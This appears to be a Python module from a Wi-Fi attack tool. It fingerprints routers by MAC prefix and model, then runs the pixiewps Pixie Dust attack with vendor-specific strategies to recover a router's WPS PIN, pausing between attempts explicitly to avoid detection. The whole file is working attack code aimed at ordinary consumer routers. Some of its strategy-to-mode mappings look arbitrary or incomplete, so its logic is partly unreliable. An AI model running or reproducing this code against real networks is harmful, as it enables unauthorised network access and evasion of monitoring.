import subprocess
import time
import re
from typing import Optional, Tuple, List, Dict

class RouterInfo:
    """Stores router information and vulnerability details."""
    
    def __init__(self):
        self.model = ''
        self.manufacturer = ''
        self.vulnerability_type = ''
        self.attack_strategy = []
        self.required_data = []
    
    @staticmethod
    def identify_router(bssid: str, model_str: str) -> 'RouterInfo':
        """Identifies router model and its known vulnerabilities."""
        info = RouterInfo()
        
        # Extended manufacturer prefixes based on vulnwsc.txt
        manufacturer_prefixes = {
            '00:90:4C': 'Epigram/Broadcom',
            'F8:1A:67': 'TP-Link',
            'E4:F4:C6': 'NETGEAR',
            '00:18:F3': 'ASUSTek',
            'C8:3A:35': 'Tenda',
            '00:1A:2B': 'Cisco',
            'C0:56:27': 'Belkin',
            '00:24:01': 'D-Link',
            'F4:EC:38': 'TP-Link',
            '28:EE:52': 'Belkin',
            '00:26:F2': 'NETGEAR',
            'C8:D7:19': 'Cisco-Linksys',
            '00:23:69': 'Cisco-Linksys',
            '00:22:75': 'Belkin',
            '00:1E:E5': 'Cisco-Linksys',
            '20:AA:4B': 'Cisco-Linksys',
            'EC:1A:59': 'Belkin',
            '08:86:3B': 'Belkin',
            '94:10:3E': 'Belkin',
            'B4:75:0E': 'Belkin',
            '00:8E:F2': 'NETGEAR'
        }
        
        # Identify manufacturer from BSSID
        mac_prefix = bssid[:8].upper()
        info.manufacturer = manufacturer_prefixes.get(mac_prefix, 'Unknown')
        
        # Match router model against vulnerability database
        info.model = model_str
        info.vulnerability_type = RouterInfo._get_vulnerability_type(model_str, info.manufacturer)
        info.attack_strategy = RouterInfo._get_attack_strategy(info.vulnerability_type)
        info.required_data = RouterInfo._get_required_data(info.vulnerability_type)
        
        return info
    
    @staticmethod
    def _get_vulnerability_type(model: str, manufacturer: str) -> str:
        """Determines vulnerability type based on router model and manufacturer."""
        model_upper = model.upper()
        
        # Ralink/MediaTek based devices
        if any(x in model_upper for x in ['RT28', 'RT30', 'MT76', 'MEDIATEK']):
            return 'ralink'
            
        # Broadcom based devices
        if any(x in model_upper for x in ['BCM', 'BROADCOM']) or manufacturer == 'Epigram/Broadcom':
            return 'broadcom'
            
        # Realtek based devices
        if any(x in model_upper for x in ['RTL', 'REALTEK']):
            return 'realtek'
            
        # Specific manufacturer detections
        if manufacturer == 'TP-Link':
            if 'ARCHER' in model_upper:
                return 'tplink_modern'
            return 'tplink_legacy'
            
        if manufacturer == 'NETGEAR':
            if any(x in model_upper for x in ['R6', 'R7', 'R8']):
                return 'netgear_modern'
            return 'netgear_legacy'
            
        if manufacturer == 'ASUSTek':
            if 'RT-AC' in model_upper:
                return 'asus_aes'
            return 'asus_legacy'
            
        if manufacturer == 'D-Link':
            if any(x in model_upper for x in ['DIR-8', 'DIR-7']):
                return 'dlink_modern'
            return 'dlink_legacy'
            
        return 'generic'
    
    @staticmethod
    def _get_attack_strategy(vuln_type: str) -> List[str]:
        """Returns ordered list of attack strategies based on vulnerability type."""
        strategies = {
            'ralink': ['ecos_simple', 'ecos_rtl', 'ralink', 'brcm_auto'],
            'broadcom': ['brcm_auto', 'brcm_zero', 'brcm_5_35_2', 'brcm_4_35_2'],
            'realtek': ['rtl_819x', 'rtl_820x', 'rtl_auto'],
            'tplink_modern': ['tplink_v1', 'tplink_v2', 'tplink_v3'],
            'tplink_legacy': ['ecos_simple', 'brcm_auto'],
            'netgear_modern': ['brcm_auto', 'brcm_zero', 'netgear_new'],
            'netgear_legacy': ['brcm_auto', 'brcm_zero'],
            'asus_aes': ['asus_rt', 'brcm_auto'],
            'asus_legacy': ['brcm_auto', 'ecos_simple'],
            'dlink_modern': ['dlink_auto', 'brcm_auto'],
            'dlink_legacy': ['brcm_auto', 'ecos_simple'],
            'generic': ['brcm_auto', 'ecos_simple', 'rtl_819x']
        }
        return strategies.get(vuln_type, ['brcm_auto'])

    @staticmethod
    def _get_required_data(vuln_type: str) -> List[str]:
        """Returns list of required data fields for specific vulnerability type."""
        base_fields = ['PKE', 'PKR', 'E_HASH1', 'E_HASH2', 'AUTHKEY', 'E_NONCE']
        
        extra_fields = {
            'tplink_modern': ['R_NONCE', 'E_BSSID', 'E_S1', 'E_S2'],
            'netgear_modern': ['R_NONCE', 'E_BSSID'],
            'asus_aes': ['R_NONCE', 'E_BSSID'],
            'dlink_modern': ['R_NONCE']
        }
        
        return base_fields + extra_fields.get(vuln_type, [])

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''  # Added for modern router support
        self.E_BSSID = ''  # Added for modern router support
        self.E_S1 = ''    # Added for modern router support
        self.E_S2 = ''    # Added for modern router support
        self.router_info = None
        self._data_collection_retries = 3

    def getAll(self) -> bool:
        """Check if all required data is available based on router type."""
        if not self.router_info:
            # Basic check if router info not available
            return bool(self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
                       and self.E_HASH1 and self.E_HASH2)
        
        # Check all required fields based on router type
        for field in self.router_info.required_data:
            if not getattr(self, field, ''):
                print(f'[-] Missing required data field for {self.router_info.vulnerability_type}: {field}')
                return False
        return True

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> Optional[str]:
        """Runs the pixiewps with multiple strategies and attempts to extract the WPS pin."""
        
        if not self.getAll():
            print('[!] Not enough data collected for attack. Required fields:')
            if self.router_info:
                print(f'Required for {self.router_info.vulnerability_type}: {", ".join(self.router_info.required_data)}')
            return None

        if not self.router_info:
            print('[*] Router information not available, using generic attack strategy')
            strategies = ['brcm_auto']
        else:
            strategies = self.router_info.attack_strategy
            print(f'[*] Using attack strategies for {self.router_info.manufacturer} '
                  f'({self.router_info.vulnerability_type}): {", ".join(strategies)}')

        for strategy in strategies:
            print(f'[*] Trying {strategy} strategy...')
            command = self._getPixieCmd(full_range, strategy)
            
            if show_command:
                print(' '.join(command))
            
            try:
                result = self._execute_pixiewps(command)
                if result:
                    return result
            except subprocess.TimeoutExpired:
                print(f'[-] Strategy {strategy} timed out, trying next method...')
                continue
            except subprocess.CalledProcessError as e:
                print(f'[-] Strategy {strategy} failed: {e}')
                continue
            
            # Add delay between attempts to avoid detection
            time.sleep(2)  # Increased delay to avoid detection
        
        return None

    def _execute_pixiewps(self, command: List[str]) -> Optional[str]:
        """Executes pixiewps command with timeout and returns PIN if found."""
        try:
            process = subprocess.run(
                command,
                encoding='utf-8',
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=45  # Increased timeout for modern routers
            )
            
            if process.returncode == 0:
                # Parse output for PIN
                pin = self._parse_pixiewps_output(process.stdout)
                if pin:
                    return pin
            
            return None
            
        except subprocess.TimeoutExpired:
            print('[-] Pixiewps execution timed out')
            return None

    def _parse_pixiewps_output(self, output: str) -> Optional[str]:
        """Parses pixiewps output to extract PIN and validate it."""
        for line in output.splitlines():
            if '[+]' in line and 'WPS pin' in line:
                pin = line.split(':')[-1].strip()
                
                if pin == '<empty>':
                    return ''
                    
                # Validate PIN format
                if self._validate_pin(pin):
                    return pin
                    
        return None

    def _validate_pin(self, pin: str) -> bool:
        """Validates WPS PIN format and checksum."""
        if not pin:
            return False
            
        # Remove any non-digit characters
        pin = re.sub(r'\D', '', pin)
        
        # Check length
        if len(pin) != 8:
            return False
            
        # Validate checksum
        try:
            return self._wps_pin_checksum(pin)
        except ValueError:
            return False

    def _wps_pin_checksum(self, pin: str) -> bool:
        """Validates the WPS PIN checksum."""
        if len(pin) != 8:
            return False
            
        accum = 0
        
        # PIN checksum algorithm
        accum += 3 * (int(pin[0]) + int(pin[2]) + int(pin[4]) + int(pin[6]))
        accum += int(pin[1]) + int(pin[3]) + int(pin[5]) + int(pin[7])
        
        return accum % 10 == 0

    def _getPixieCmd(self, full_range: bool = False, strategy: str = 'brcm_auto') -> List[str]:
        """Generates a list representing the command for the pixiewps tool."""
        
        pixiecmd = ['pixiewps']
        
        # Basic parameters
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE
        ])

        # Add strategy-specific parameters
        if strategy == 'ecos_simple':
            pixiecmd.extend(['--mode', '3'])
        elif strategy == 'brcm_zero':
            pixiecmd.extend(['--mode', '1'])
        elif strategy == 'tplink_v1':
            pixiecmd.extend(['--mode', '4'])
            if self.E_S1 and self.E_S2:
                pixiecmd.extend(['--e-s1', self.E_S1, '--e-s2', self.E_S2])
        elif strategy == 'brcm_5_35_2':
            pixiecmd.extend(['--mode', '2'])
        elif strategy == 'rtl_819x':
            pixiecmd.extend(['--mode', '3'])
        elif strategy == 'asus_rt':
            pixiecmd.extend(['--mode', '5'])
        
        # Additional data for modern routers
        if self.R_NONCE:
            pixiecmd.extend(['--r-nonce', self.R_NONCE])
        if self.E_BSSID:
            pixiecmd.extend(['--e-bssid', self.E_BSSID])
        
        if full_range:
            pixiecmd.append('--force')
        
        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables."""
        self.__init__()
